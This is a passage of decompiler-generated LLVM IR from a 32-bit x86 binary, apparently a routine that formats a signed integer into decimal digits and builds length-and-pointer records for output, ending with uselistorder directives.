  %stack_var_-197.2 = phi i8 [ %stack_var_-197.1, %dec_label_pc_8050683 ], [ %stack_var_-197.1, %dec_label_pc_8050689 ], [ %stack_var_-197.0, %dec_label_pc_805067f ]
  %v2_805068d = ptrtoint i32* %stack_var_-22 to i32
  store i32 %v2_805068d, i32* %eax.global-to-local, align 4
  %v0_805069c = load i32, i32* %edx.global-to-local, align 4
  %v1_805069c = add i32 %v0_805069c, 1
  store i32 %v1_805069c, i32* %edi.global-to-local, align 4
  store i32 1, i32* %stack_var_-152, align 4
  %v1_80506ab = inttoptr i32 %v0_805069c to i8*
  %v2_80506ab = load i8, i8* %v1_80506ab, align 1
  %v3_80506ab = zext i8 %v2_80506ab to i32
  %v5_80506ab = and i32 %v2_805068d, -256
  %v6_80506ab = or i32 %v3_80506ab, %v5_80506ab
  store i32 %v6_80506ab, i32* %eax.global-to-local, align 4
  store i32 %v6_80506ab, i32* %stack_var_-22, align 4
  %v2_80506c0 = sub i32 %v1_8050645, %v1_805069c
  store i32 %v2_80506c0, i32* %edx.global-to-local, align 4
  %v1_80506c2 = icmp eq i32 %v1_805071d, 0
  %v2_80506c2 = icmp slt i32 %v1_805071d, 0
  br i1 %v2_80506c2, label %dec_label_pc_8050711, label %dec_label_pc_80506c6

dec_label_pc_80506c6:                             ; preds = %dec_label_pc_805068d
  %v2_80506c6 = sub i32 %v1_805071d, %v2_80506c0
  %v8_80506c6 = xor i32 %v2_80506c0, %v1_805071d
  %v9_80506c6 = xor i32 %v2_80506c6, %v1_805071d
  %v10_80506c6 = and i32 %v9_80506c6, %v8_80506c6
  %v11_80506c6 = icmp slt i32 %v10_80506c6, 0
  %v13_80506c6 = icmp slt i32 %v2_80506c6, 0
  store i32 112, i32* %stack_var_-144, align 4
  %v2_80506d4 = icmp eq i1 %v13_80506c6, %v11_80506c6
  br i1 %v2_80506d4, label %dec_label_pc_80506d6, label %dec_label_pc_805070a

dec_label_pc_80506d6:                             ; preds = %dec_label_pc_80506c6
  store i32 %v2_80506c6, i32* %eax.global-to-local, align 4
  %tmp186 = icmp slt i32 %v2_80506c6, 1
  %tmp187 = icmp eq i1 %tmp186, false
  br i1 %tmp187, label %dec_label_pc_80506eb, label %dec_label_pc_8050706

dec_label_pc_80506eb:                             ; preds = %dec_label_pc_80506d6
  store i32 176, i32* %stack_var_-132, align 4
  br label %dec_label_pc_8050706

dec_label_pc_8050706:                             ; preds = %dec_label_pc_80506d6, %dec_label_pc_80506eb
  %storemerge27.in = phi i32* [ %stack_var_-120, %dec_label_pc_80506eb ], [ %stack_var_-132, %dec_label_pc_80506d6 ]
  store i32 -1, i32* %ebx.global-to-local, align 4
  %storemerge27 = ptrtoint i32* %storemerge27.in to i32
  store i32 %storemerge27, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050726

dec_label_pc_805070a:                             ; preds = %dec_label_pc_80506c6
  %v4_805070c = icmp eq i1 %v1_80506c2, false
  br i1 %v4_805070c, label %dec_label_pc_8050717, label %dec_label_pc_805070e

dec_label_pc_805070e:                             ; preds = %dec_label_pc_805070a
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050711

dec_label_pc_8050711:                             ; preds = %dec_label_pc_805068d, %dec_label_pc_805070e
  %v0_8050759111 = phi i32 [ %v1_805071d, %dec_label_pc_805068d ], [ -1, %dec_label_pc_805070e ]
  %v2_8050711 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8050711, i32* @ecx, align 4
  br label %dec_label_pc_8050726

dec_label_pc_8050717:                             ; preds = %dec_label_pc_805070a
  %v2_805071b = add i32 %v1_805069c, %v1_805071d
  store i32 %v2_805071b, i32* %edi.global-to-local, align 4
  %v2_805071d = sub i32 %v2_80506c0, %v1_805071d
  store i32 %v2_805071d, i32* %edx.global-to-local, align 4
  %v2_805071f = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_805071f, i32* @ecx, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050726

dec_label_pc_8050726:                             ; preds = %dec_label_pc_8050711, %dec_label_pc_8050706, %dec_label_pc_8050717
  %v0_8050759110 = phi i32 [ %v0_8050759111, %dec_label_pc_8050711 ], [ -1, %dec_label_pc_8050706 ], [ -1, %dec_label_pc_8050717 ]
  %v0_8050742 = phi i32 [ %v2_8050711, %dec_label_pc_8050711 ], [ %storemerge27, %dec_label_pc_8050706 ], [ %v2_805071f, %dec_label_pc_8050717 ]
  %v0_8050733 = phi i32 [ %v2_80506c0, %dec_label_pc_8050711 ], [ 0, %dec_label_pc_8050706 ], [ %v2_805071d, %dec_label_pc_8050717 ]
  store i32 %tmp155, i32* %eax.global-to-local, align 4
  %v2_805072d = inttoptr i32 %v1_80503a3 to i8*
  %v3_805072d = load i8, i8* %v2_805072d, align 1
  %v4_805072d = and i8 %v3_805072d, 16
  %v5_805072d = icmp eq i8 %v4_805072d, 0
  %v1_8050731 = icmp eq i1 %v5_805072d, false
  br i1 %v1_8050731, label %dec_label_pc_8050742, label %dec_label_pc_8050733

dec_label_pc_8050733:                             ; preds = %dec_label_pc_8050726
  %v1_8050733 = icmp eq i32 %v0_8050733, 0
  %v1_8050735 = icmp eq i1 %v1_8050733, false
  br i1 %v1_8050735, label %dec_label_pc_8050742, label %dec_label_pc_8050737

dec_label_pc_8050737:                             ; preds = %dec_label_pc_8050733
  br i1 %v12_805059b, label %dec_label_pc_8050759, label %dec_label_pc_805073e

dec_label_pc_805073e:                             ; preds = %dec_label_pc_8050737
  %v0_805073e = load i32, i32* %ebp.global-to-local, align 4
  %tmp188 = icmp slt i32 %v0_805073e, 1
  br i1 %tmp188, label %dec_label_pc_8050759, label %dec_label_pc_8050742

dec_label_pc_8050742:                             ; preds = %dec_label_pc_805073e, %dec_label_pc_8050733, %dec_label_pc_8050726
  %v1_8050742 = inttoptr i32 %v0_8050742 to i32*
  store i32 112, i32* %v1_8050742, align 4
  %v0_8050748 = load i32, i32* @ecx, align 4
  %v1_8050748 = add i32 %v0_8050748, 4
  %v2_8050748 = inttoptr i32 %v1_8050748 to i32*
  store i32 1, i32* %v2_8050748, align 4
  %v0_805074f = load i32, i32* @ecx, align 4
  %v1_805074f = add i32 %v0_805074f, 8
  %v2_805074f = inttoptr i32 %v1_805074f to i32*
  store i32 ptrtoint (i32* @global_var_8054f60.193 to i32), i32* %v2_805074f, align 4
  %v0_8050756 = load i32, i32* @ecx, align 4
  %v1_8050756 = add i32 %v0_8050756, 12
  store i32 %v1_8050756, i32* @ecx, align 4
  %v0_8050759.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050759

dec_label_pc_8050759:                             ; preds = %dec_label_pc_805073e, %dec_label_pc_8050737, %dec_label_pc_8050742
  %v0_8050760 = phi i32 [ %v0_8050742, %dec_label_pc_805073e ], [ %v0_8050742, %dec_label_pc_8050737 ], [ %v1_8050756, %dec_label_pc_8050742 ]
  %v0_8050759 = phi i32 [ %v0_8050759110, %dec_label_pc_805073e ], [ %v0_8050759110, %dec_label_pc_8050737 ], [ %v0_8050759.pre, %dec_label_pc_8050742 ]
  %v1_8050759 = add i32 %v0_8050759, 1
  %v8_8050759 = icmp eq i32 %v1_8050759, 0
  store i32 %v1_8050759, i32* %ebx.global-to-local, align 4
  br i1 %v8_8050759, label %dec_label_pc_8050773, label %dec_label_pc_805075c

dec_label_pc_805075c:                             ; preds = %dec_label_pc_8050759
  %v1_805075e = sub i32 -1, %v0_8050759
  store i32 %v1_805075e, i32* %eax.global-to-local, align 4
  %v1_8050760 = inttoptr i32 %v0_8050760 to i32*
  store i32 176, i32* %v1_8050760, align 4
  %v0_8050766 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050766 = load i32, i32* @ecx, align 4
  %v2_8050766 = add i32 %v1_8050766, 4
  %v3_8050766 = inttoptr i32 %v2_8050766 to i32*
  store i32 %v0_8050766, i32* %v3_8050766, align 4
  %v0_8050769 = load i32, i32* @ecx, align 4
  %v1_8050769 = add i32 %v0_8050769, 8
  %v2_8050769 = inttoptr i32 %v1_8050769 to i32*
  store i32 ptrtoint (i32* @global_var_8054f53.192 to i32), i32* %v2_8050769, align 4
  %v0_8050770 = load i32, i32* @ecx, align 4
  %v1_8050770 = add i32 %v0_8050770, 12
  store i32 %v1_8050770, i32* @ecx, align 4
  br label %dec_label_pc_8050773

dec_label_pc_8050773:                             ; preds = %dec_label_pc_8050759, %dec_label_pc_805075c
  %v0_8050777 = phi i32 [ %v0_8050760, %dec_label_pc_8050759 ], [ %v1_8050770, %dec_label_pc_805075c ]
  %v0_8050773 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050773 = icmp eq i32 %v0_8050773, 0
  br i1 %v1_8050773, label %dec_label_pc_8050786, label %dec_label_pc_8050777

dec_label_pc_8050777:                             ; preds = %dec_label_pc_8050773
  %v1_8050777 = inttoptr i32 %v0_8050777 to i32*
  store i32 112, i32* %v1_8050777, align 4
  %v0_805077d = load i32, i32* %edx.global-to-local, align 4
  %v1_805077d = load i32, i32* @ecx, align 4
  %v2_805077d = add i32 %v1_805077d, 4
  %v3_805077d = inttoptr i32 %v2_805077d to i32*
  store i32 %v0_805077d, i32* %v3_805077d, align 4
  %v0_8050780 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050780 = load i32, i32* @ecx, align 4
  %v2_8050780 = add i32 %v1_8050780, 8
  %v3_8050780 = inttoptr i32 %v2_8050780 to i32*
  store i32 %v0_8050780, i32* %v3_8050780, align 4
  %v0_8050783 = load i32, i32* @ecx, align 4
  %v1_8050783 = add i32 %v0_8050783, 12
  store i32 %v1_8050783, i32* @ecx, align 4
  br label %dec_label_pc_8050786

dec_label_pc_8050786:                             ; preds = %dec_label_pc_8050773, %dec_label_pc_8050777
  %v0_80507a4 = phi i32 [ %v0_8050777, %dec_label_pc_8050773 ], [ %v1_8050783, %dec_label_pc_8050777 ]
  br i1 %v1_80505a0, label %dec_label_pc_805079a, label %dec_label_pc_805078d

dec_label_pc_805078d:                             ; preds = %dec_label_pc_8050786
  store i32 %tmp155, i32* %eax.global-to-local, align 4
  %v3_8050794 = load i8, i8* %v2_805072d, align 1
  %v4_8050794 = and i8 %v3_8050794, 16
  %v5_8050794 = icmp eq i8 %v4_8050794, 0
  br i1 %v5_8050794, label %dec_label_pc_80507b7, label %dec_label_pc_805079a

dec_label_pc_805079a:                             ; preds = %dec_label_pc_805078d, %dec_label_pc_8050786
  %v0_805079a = load i32, i32* %edx.global-to-local, align 4
  %v1_805079c = load i32, i32* %ebx.global-to-local, align 4
  %v2_805079c = sub i32 %v0_805079a, %v1_805079c
  store i32 %v2_805079c, i32* %eax.global-to-local, align 4
  %v1_805079e = load i32, i32* %ebp.global-to-local, align 4
  %v2_805079e = sub i32 %v2_805079c, %v1_805079e
  %v8_805079e = xor i32 %v1_805079e, %v2_805079c
  %v9_805079e = xor i32 %v2_805079e, %v2_805079c
  %v10_805079e = and i32 %v9_805079e, %v8_805079e
  %v11_805079e = icmp slt i32 %v10_805079e, 0
  %v13_805079e = icmp slt i32 %v2_805079e, 0
  %v2_80507a0 = icmp eq i1 %v13_805079e, %v11_805079e
  br i1 %v2_80507a0, label %dec_label_pc_80507b7, label %dec_label_pc_80507a2

dec_label_pc_80507a2:                             ; preds = %dec_label_pc_805079a
  %v2_80507a2 = sub i32 %v1_805079e, %v2_805079c
  store i32 %v2_80507a2, i32* %ebp.global-to-local, align 4
  %v1_80507a4 = inttoptr i32 %v0_80507a4 to i32*
  store i32 176, i32* %v1_80507a4, align 4
  %v0_80507aa = load i32, i32* %ebp.global-to-local, align 4
  %v1_80507aa = load i32, i32* @ecx, align 4
  %v2_80507aa = add i32 %v1_80507aa, 4
  %v3_80507aa = inttoptr i32 %v2_80507aa to i32*
  store i32 %v0_80507aa, i32* %v3_80507aa, align 4
  %v0_80507ad = load i32, i32* @ecx, align 4
  %v1_80507ad = add i32 %v0_80507ad, 8
  %v2_80507ad = inttoptr i32 %v1_80507ad to i32*
  store i32 ptrtoint (i32* @global_var_8054f53.192 to i32), i32* %v2_80507ad, align 4
  %v0_80507b4 = load i32, i32* @ecx, align 4
  %v1_80507b4 = add i32 %v0_80507b4, 12
  store i32 %v1_80507b4, i32* @ecx, align 4
  br label %dec_label_pc_80507b7

dec_label_pc_80507b7:                             ; preds = %dec_label_pc_805079a, %dec_label_pc_805078d, %dec_label_pc_80507a2
  %v1_805083f120 = phi i32 [ %v0_80507a4, %dec_label_pc_805079a ], [ %v0_80507a4, %dec_label_pc_805078d ], [ %v1_80507b4, %dec_label_pc_80507a2 ]
  %v12_80507b7 = icmp eq i8 %stack_var_-197.2, 102
  br i1 %v12_80507b7, label %dec_label_pc_8050832, label %dec_label_pc_80507be

dec_label_pc_80507be:                             ; preds = %dec_label_pc_80507b7
  %v5_80507be = load i32, i32* %edx.global-to-local, align 4
  %v6_80507be = and i32 %v5_80507be, -256
  %v7_80507be = or i32 %v6_80507be, %stack_var_-42.0
  store i32 %v7_80507be, i32* %edx.global-to-local, align 4
  %v0_80507c5 = load i32, i32* %esi.global-to-local, align 4
  %v2_80507c5 = icmp slt i32 %v0_80507c5, 0
  %v1_80507c7 = trunc i32 %stack_var_-42.0 to i8
  br i1 %v2_80507c5, label %dec_label_pc_80507d6, label %dec_label_pc_80507df

dec_label_pc_80507d6:                             ; preds = %dec_label_pc_80507be
  store i32 %v0_80507c5, i32* %edx.global-to-local, align 4
  %v1_80507d8 = sub i32 0, %v0_80507c5
  br label %dec_label_pc_80507df

dec_label_pc_80507df:                             ; preds = %dec_label_pc_80507be, %dec_label_pc_80507d6
  %storemerge26 = phi i32 [ %v1_80507d8, %dec_label_pc_80507d6 ], [ %v0_80507c5, %dec_label_pc_80507be ]
  %storemerge8 = phi i8 [ 45, %dec_label_pc_80507d6 ], [ 43, %dec_label_pc_80507be ]
  store i32 %storemerge26, i32* %edx.global-to-local, align 4
  store i32 0, i32* %stack_var_-27, align 4
  %v2_80507e7 = ptrtoint i32* %stack_var_-27 to i32
  store i32 %v2_80507e7, i32* %ebx.global-to-local, align 4
  store i32 2, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80507f3

dec_label_pc_80507f3:                             ; preds = %dec_label_pc_80507f3.backedge, %dec_label_pc_80507df
  %v0_80507fe = phi i32 [ %v0_80507fe.pre, %dec_label_pc_80507f3.backedge ], [ %v2_80507e7, %dec_label_pc_80507df ]
  %v0_80507fb = phi i32 [ %v0_80507fb.pre, %dec_label_pc_80507f3.backedge ], [ 2, %dec_label_pc_80507df ]
  %v0_80507f3 = phi i32 [ %v9_80507fc, %dec_label_pc_80507f3.backedge ], [ %storemerge26, %dec_label_pc_80507df ]
  %v1_80507fa = ashr i32 %v0_80507f3, 31
  %v1_80507fb = add i32 %v0_80507fb, 1
  store i32 %v1_80507fb, i32* %edi.global-to-local, align 4
  %v2_80507fc = zext i32 %v0_80507f3 to i64
  %v4_80507fc = zext i32 %v1_80507fa to i64
  %v5_80507fc = mul nuw i64 %v4_80507fc, 4294967296
  %v6_80507fc = or i64 %v5_80507fc, %v2_80507fc
  %v8_80507fc = sdiv i64 %v6_80507fc, 10
  %v9_80507fc = trunc i64 %v8_80507fc to i32
  %v10_80507fc = srem i64 %v6_80507fc, 10
  %v1_80507fe = add i32 %v0_80507fe, -1
  store i32 %v1_80507fe, i32* %ebx.global-to-local, align 4
  store i32 %v9_80507fc, i32* %esi.global-to-local, align 4
  %v3_8050801 = and i32 %v9_80507fc, -256
  %v1_8050803 = trunc i64 %v10_80507fc to i8
  %v2_8050803 = add i8 %v1_8050803, 48
  %v12_8050803 = zext i8 %v2_8050803 to i32
  %v15_8050803 = or i32 %v12_8050803, %v3_8050801
  store i32 %v15_8050803, i32* %eax.global-to-local, align 4
  %v3_8050808 = inttoptr i32 %v1_80507fe to i8*
  store i8 %v2_8050803, i8* %v3_8050808, align 1
  store i32 %v9_80507fc, i32* %edx.global-to-local, align 4
  %v7_805080c = icmp sgt i32 %v1_80507fb, 3
  br i1 %v7_805080c, label %dec_label_pc_805080e, label %dec_label_pc_80507f3.backedge

dec_label_pc_805080e:                             ; preds = %dec_label_pc_80507f3
  %v2_805080e = icmp eq i32 %v9_80507fc, 0
  %v1_8050810 = icmp eq i1 %v2_805080e, false
  br i1 %v1_8050810, label %dec_label_pc_80507f3.backedge, label %dec_label_pc_8050812

dec_label_pc_80507f3.backedge:                    ; preds = %dec_label_pc_805080e, %dec_label_pc_80507f3
  %v0_80507fb.pre = load i32, i32* %edi.global-to-local, align 4
  %v0_80507fe.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80507f3

dec_label_pc_8050812:                             ; preds = %dec_label_pc_805080e
  %v4_8050812 = zext i8 %storemerge8 to i32
  %v7_8050812 = or i32 %v3_8050801, %v4_8050812
  store i32 %v7_8050812, i32* %edx.global-to-local, align 4
  %v0_8050816 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050816 = add i32 %v0_8050816, -2
  store i32 %v1_8050816, i32* %eax.global-to-local, align 4
  %v3_8050819 = add i32 %v0_8050816, -1
  %v4_8050819 = inttoptr i32 %v3_8050819 to i8*
  store i8 %storemerge8, i8* %v4_8050819, align 1
  %v5_805081c = load i32, i32* %edx.global-to-local, align 4
  %v6_805081c = and i32 %v5_805081c, -256
  %v7_805081c = or i32 %v6_805081c, %stack_var_-42.0
  store i32 %v7_805081c, i32* %edx.global-to-local, align 4
  %v2_8050820 = load i32, i32* %ebx.global-to-local, align 4
  %v3_8050820 = add i32 %v2_8050820, -2
  %v4_8050820 = inttoptr i32 %v3_8050820 to i8*
  store i8 %v1_80507c7, i8* %v4_8050820, align 1
  %v0_8050823 = load i32, i32* @ecx, align 4
  %v1_8050823 = inttoptr i32 %v0_8050823 to i32*
  store i32 112, i32* %v1_8050823, align 4
  %v0_8050829 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050829 = load i32, i32* @ecx, align 4
  %v2_8050829 = add i32 %v1_8050829, 4
  %v3_8050829 = inttoptr i32 %v2_8050829 to i32*
  store i32 %v0_8050829, i32* %v3_8050829, align 4
  %v0_805082c = load i32, i32* %eax.global-to-local, align 4
  %v1_805082c = load i32, i32* @ecx, align 4
  %v2_805082c = add i32 %v1_805082c, 8
  %v3_805082c = inttoptr i32 %v2_805082c to i32*
  store i32 %v0_805082c, i32* %v3_805082c, align 4
  %v0_805082f = load i32, i32* @ecx, align 4
  %v1_805082f = add i32 %v0_805082f, 12
  store i32 %v1_805082f, i32* @ecx, align 4
  br label %dec_label_pc_8050832

dec_label_pc_8050832:                             ; preds = %dec_label_pc_80507b7, %dec_label_pc_8050461, %dec_label_pc_8050812
  %v0_80508b1 = phi i32 [ %v1_805083f120, %dec_label_pc_80507b7 ], [ %v2_8050469, %dec_label_pc_8050461 ], [ %v1_805082f, %dec_label_pc_8050812 ]
  %v2_8050832 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_8050832, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050836

dec_label_pc_8050836:                             ; preds = %dec_label_pc_8050836, %dec_label_pc_8050832
  %v0_8050836 = phi i32 [ %v2_8050832, %dec_label_pc_8050832 ], [ %v1_8050838, %dec_label_pc_8050836 ]
  %stack_var_-216.0 = phi i32 [ %v3_8050363, %dec_label_pc_8050832 ], [ %v5_805083b, %dec_label_pc_8050836 ]
  %v1_8050836 = inttoptr i32 %v0_8050836 to i32*
  %v2_8050836 = load i32, i32* %v1_8050836, align 4
  store i32 %v2_8050836, i32* %ebx.global-to-local, align 4
  %v1_8050838 = add i32 %v0_8050836, 12
  store i32 %v1_8050838, i32* %eax.global-to-local, align 4
  %v5_805083b = sub i32 %stack_var_-216.0, %v2_8050836
  %v7_805083f = icmp ult i32 %v1_8050838, %v0_80508b1
  br i1 %v7_805083f, label %dec_label_pc_8050836, label %dec_label_pc_8050843

dec_label_pc_8050843:                             ; preds = %dec_label_pc_8050836
  store i32 %v0_80508b1, i32* %esi.global-to-local, align 4
  %v5_8050856 = icmp eq i8 %stack_var_-26.0, 0
  store i32 160, i32* %stack_var_-168, align 4
  %v1_8050866 = icmp eq i1 %v5_8050856, false
  %v2_8050866 = zext i1 %v1_8050866 to i32
  store i32 %v2_8050866, i32* %edx.global-to-local, align 4
  %v2_8050869 = sub i32 %v5_805083b, %v2_8050866
  store i32 %v2_8050869, i32* %eax.global-to-local, align 4
  %tmp189 = icmp slt i32 %v2_8050869, 1
  br i1 %tmp189, label %dec_label_pc_80508b3, label %dec_label_pc_8050873

dec_label_pc_8050873:                             ; preds = %dec_label_pc_8050843
  store i32 %tmp155, i32* %edx.global-to-local, align 4
  %v2_805087a = inttoptr i32 %v1_80503a3 to i8*
  %v3_805087a = load i8, i8* %v2_805087a, align 1
  %v4_805087a = and i8 %v3_805087a, 8
  %v5_805087a = icmp eq i8 %v4_805087a, 0
  br i1 %v5_805087a, label %dec_label_pc_8050895, label %dec_label_pc_8050880

dec_label_pc_8050880:                             ; preds = %dec_label_pc_8050873
  %v1_8050880 = add i32 %v0_80508b1, 12
  store i32 %v1_8050880, i32* %esi.global-to-local, align 4
  %v1_8050883 = inttoptr i32 %v0_80508b1 to i32*
  store i32 160, i32* %v1_8050883, align 4
  %v1_8050889 = load i32, i32* @ecx, align 4
  %v2_8050889 = add i32 %v1_8050889, 4
  %v3_8050889 = inttoptr i32 %v2_8050889 to i32*
  store i32 %v2_8050869, i32* %v3_8050889, align 4
  %v0_805088c = load i32, i32* @ecx, align 4
  %v1_805088c = add i32 %v0_805088c, 8
  %v2_805088c = inttoptr i32 %v1_805088c to i32*
  store i32 ptrtoint (i32* @global_var_8054f53.192 to i32), i32* %v2_805088c, align 4
  br label %dec_label_pc_80508b3

dec_label_pc_8050895:                             ; preds = %dec_label_pc_8050873
  store i32 %tmp155, i32* %ebx.global-to-local, align 4
  %v1_805089c = add i32 %tmp155, 16
  %v2_805089c = inttoptr i32 %v1_805089c to i32*
  %v3_805089c = load i32, i32* %v2_805089c, align 4
  %v9_805089c = icmp eq i32 %v3_805089c, 48
  %v1_80508a0 = icmp eq i1 %v9_805089c, false
  br i1 %v1_80508a0, label %dec_label_pc_80508ad, label %dec_label_pc_80508a2

dec_label_pc_80508a2:                             ; preds = %dec_label_pc_8050895
  %v3_80508a2 = load i32, i32* %stack_var_-152, align 4
  %v5_80508a2 = add i32 %v3_80508a2, %v2_8050869
  store i32 %v5_80508a2, i32* %stack_var_-152, align 4
  br label %dec_label_pc_80508b1

dec_label_pc_80508a8:                             ; preds = %dec_label_pc_80508b9
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80508e0

dec_label_pc_80508ad:                             ; preds = %dec_label_pc_8050895
  br label %dec_label_pc_80508b1

dec_label_pc_80508b1:                             ; preds = %dec_label_pc_80508a2, %dec_label_pc_80508ad
  store i32 %v0_80508b1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80508b3

dec_label_pc_80508b3:                             ; preds = %dec_label_pc_8050843, %dec_label_pc_8050880, %dec_label_pc_80508b1
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_80508b5 = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_80508b5, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80508b9

dec_label_pc_80508b9:                             ; preds = %dec_label_pc_80508d7, %dec_label_pc_80508b3
  call void @__pseudo_call(i32 %tmp155)
  %v1_80508d2 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80508d2 = add i32 %v1_80508d2, 4
  %v3_80508d2 = inttoptr i32 %v2_80508d2 to i32*
  %v4_80508d2 = load i32, i32* %v3_80508d2, align 4
  %v15_80508d2 = icmp eq i32 %v2_8050869, %v4_80508d2
  %v1_80508d5 = icmp eq i1 %v15_80508d2, false
  br i1 %v1_80508d5, label %dec_label_pc_80508a8, label %dec_label_pc_80508d7

dec_label_pc_80508d7:                             ; preds = %dec_label_pc_80508b9
  %v1_80508d7 = add i32 %v1_80508d2, 12
  store i32 %v1_80508d7, i32* %ebx.global-to-local, align 4
  %v0_80508da = load i32, i32* %edi.global-to-local, align 4
  %v2_80508da = add i32 %v0_80508da, %v2_8050869
  store i32 %v2_80508da, i32* %edi.global-to-local, align 4
  %v1_80508dc = load i32, i32* %esi.global-to-local, align 4
  %v7_80508dc = icmp ult i32 %v1_80508d7, %v1_80508dc
  br i1 %v7_80508dc, label %dec_label_pc_80508b9, label %dec_label_pc_80508e0

dec_label_pc_80508e0:                             ; preds = %dec_label_pc_80508d7, %dec_label_pc_80508a8
  %v0_80508e6 = phi i32 [ -1, %dec_label_pc_80508a8 ], [ %v2_80508da, %dec_label_pc_80508d7 ]
  store i32 %v0_80508e6, i32* %eax.global-to-local, align 4
  %v2_80508e9 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80508e9, i32* @esi, align 4
  store i32 %v0_8050346, i32* @edi, align 4
  store i32 %v0_8050345, i32* @ebp, align 4
  ret i32 %v0_80508e6

; uselistorder directives
  uselistorder i32 %v0_80508e6, { 1, 0 }
  uselistorder i32 %v2_8050869, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v2_8050866, { 1, 0 }
  uselistorder i32 %v1_8050838, { 1, 2, 0 }
  uselistorder i32 %v0_8050836, { 1, 0 }
  uselistorder i32 %v0_80508b1, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v9_80507fc, { 3, 2, 1, 0, 4 }
  uselistorder i8 %storemerge8, { 1, 0 }
  uselistorder i32 %v0_80507c5, { 2, 1, 0, 3 }
  uselistorder i32 %v2_805079e, { 1, 0 }
  uselistorder i32 %v1_805079e, { 1, 0, 2 }
  uselistorder i32 %v2_805079c, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_8050759, { 1, 0 }
  uselistorder i32 %v2_80506c6, { 2, 1, 3, 0 }
  uselistorder i32 %v2_80506c0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_805071d, { 4, 0, 3, 1, 2, 5, 6, 7 }
  uselistorder i32 %v1_805065c, { 1, 0 }
  uselistorder i32 %v0_8050657, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8050624, { 1, 2, 3, 0, 4 }
  uselistorder i8 %v2_805061f, { 1, 0 }
  uselistorder i8 %v2_8050618, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_8050618, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-220.3, { 1, 0 }
  uselistorder i32 %v0_80505a2, { 1, 2, 0 }
  uselistorder i32 %stack_var_-42.0, { 0, 2, 1 }
  uselistorder i8 %stack_var_-207.1, { 4, 3, 1, 5, 0, 2 }
  uselistorder i8 %v4_8050587, { 1, 0 }
  uselistorder i32 %tmp194, { 3, 1, 2, 0 }
  uselistorder x86_fp80 %v3_8050552, { 1, 0 }
  uselistorder i32 %v2_805050b, { 2, 1, 0 }
  uselistorder i32 %v0_80505c1, { 1, 2, 0, 3 }
  uselistorder x86_fp80 %v1_80504dd, { 1, 0 }
  uselistorder x86_fp80 %v3_80504bf, { 2, 0, 1, 3, 6, 7, 5, 8, 4, 9, 10 }
  uselistorder i32 %v3_80504bc, { 1, 0 }
  uselistorder x86_fp80 %v4_80504a4, { 2, 0, 1, 3, 4 }
  uselistorder x86_fp80 %v3_805049e, { 1, 2, 0 }
  uselistorder i32 %v3_805049b, { 1, 0 }
  uselistorder i32 %v1_8050494, { 3, 0, 1, 2 }
  uselistorder i32 %stack_var_-220.0, { 2, 0, 1 }
  uselistorder x86_fp80 %v1_80504cd, { 8, 1, 2, 5, 3, 4, 6, 0, 7, 9 }
  uselistorder x86_fp80 %v2_8050495, { 1, 0 }
  uselistorder i8 %v4_8050445, { 1, 0 }
  uselistorder i3 %v1_80503e2, { 1, 0, 2 }
  uselistorder i8 %stack_var_-207.0, { 3, 2, 0, 4, 5, 1, 6, 7 }
  uselistorder i8 %v3_805036a, { 1, 0, 2, 3 }
  uselistorder i32 %v3_8050363, { 1, 0, 2 }
  uselistorder i3 %v4_805035c, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-71, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 2, 0, 1 }
  uselistorder i32* %stack_var_-27, { 1, 0 }
  uselistorder i32* %stack_var_-152, { 0, 1, 4, 2, 3 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32 %tmp155, { 14, 13, 12, 11, 10, 9, 8, 7, 0, 6, 1, 2, 3, 5, 4 }
  uselistorder x86_fp80 %tmp154, { 3, 2, 1, 0, 4, 5 }
  uselistorder x86_fp80* %st1.global-to-local, { 5, 6, 7, 8, 0, 10, 1, 2, 11, 3, 12, 9, 4 }
  uselistorder x86_fp80* %st0.global-to-local, { 2, 7, 8, 0, 3, 4, 5, 1, 6 }
  uselistorder i3* %fpu_stat_TOP.global-to-local, { 0, 5, 4, 6, 7, 8, 1, 9, 10, 2, 3 }
  uselistorder i32* %esi.global-to-local, { 10, 0, 1, 11, 12, 5, 3, 4, 2, 6, 7, 8, 9 }
  uselistorder i32* %edx.global-to-local, { 0, 21, 22, 23, 24, 25, 28, 26, 27, 4, 6, 5, 7, 2, 3, 8, 11, 9, 12, 10, 13, 14, 15, 16, 17, 1, 18, 19, 20 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 8, 7, 9, 10, 5, 4, 6 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 3, 20, 22, 23, 21, 24, 25, 26, 27, 28, 29, 4, 17, 5, 6, 7, 8, 12, 13, 9, 10, 11, 14, 15, 16, 18, 19 }
